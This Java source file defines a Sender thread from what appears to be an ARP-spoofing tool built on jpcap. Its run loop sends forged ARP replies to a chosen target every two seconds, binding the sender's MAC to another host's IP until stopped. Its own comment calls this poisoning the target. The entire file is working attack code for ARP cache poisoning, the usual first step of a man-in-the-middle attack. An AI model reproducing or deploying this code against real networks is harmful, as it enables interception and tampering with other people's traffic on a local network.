package tools;

import java.net.InetAddress;
import java.net.UnknownHostException;

import jpcap.JpcapSender;



//This object send fake packet every second to poison a certain target (by IP) It continues until stopped (with stop() method).

public class Sender implements Runnable {

	static Table table;
	private static FakeARP sendARP;
	private String targetIP;
	private String connectedIP;
	private boolean stop;
	private byte[] thisMac;

	public Sender(String targetIP, String connectedIP, byte[] thisMac, JpcapSender sender) {

		table = new Table();
		sendARP = new FakeARP(sender);		
		this.targetIP = targetIP;
		this.connectedIP = connectedIP;
		this.thisMac = thisMac;
	}

	public void stop() {
		this.stop = true;
	}

	@Override
	public void run() {
		this.stop = false;
		try {
			if (table.contains(targetIP)) {
				byte[] toIP = (InetAddress.getByName(targetIP)).getAddress();
				byte[] toMAC = this.MacStringToByte(table.getMac(targetIP));
				while (!stop) {
					byte[] fromIP = (InetAddress.getByName(this.connectedIP)).getAddress();
					sendARP.send(fromIP, thisMac, toIP, toMAC);
					Thread thisThread = Thread.currentThread();
					thisThread.sleep(2000L);
				}
			} else {
				System.out.println("Thread error: ip " + targetIP + " not found");
			}
		} catch (UnknownHostException e) {
			System.out.println(connectedIP + " is not a valid IP");
		} catch (InterruptedException e) {
			stop = true;
			// System.out.println("The thread with target " + targetIP + " has been interrupted without stop method");
		} catch (IllegalArgumentException e) {
			System.out.println("Invalid mac address for ip " + targetIP + ", the thread has been stopped");
		}

	}

	public byte[] MacStringToByte(String macAddress) {
		String[] split = macAddress.split(":");
		//System.out.println("length = " + split.length);
		if (split.length != 6)
			throw new IllegalArgumentException();
		byte[] ret = new byte[6];
		for (int i = 0; i < split.length; i++) {
			ret[i] = (byte) (int) Integer.valueOf(split[i], 16);
		}

		return ret;
	}

}
